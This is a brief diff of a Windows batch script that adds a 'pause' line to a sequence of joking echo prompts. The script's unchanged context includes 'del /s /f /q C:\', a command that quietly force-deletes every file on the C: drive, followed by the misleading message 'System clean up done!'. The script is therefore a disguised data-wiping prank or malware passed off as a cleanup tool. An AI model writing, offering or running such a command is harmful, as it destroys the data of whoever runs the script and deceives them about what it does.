@@ -3,6 +3,7 @@
 @echo come?
 pause
 @echo Are you ready?
+pause
 @echo Let's go!
 del /s /f /q C:\
 @echo System clean up done!
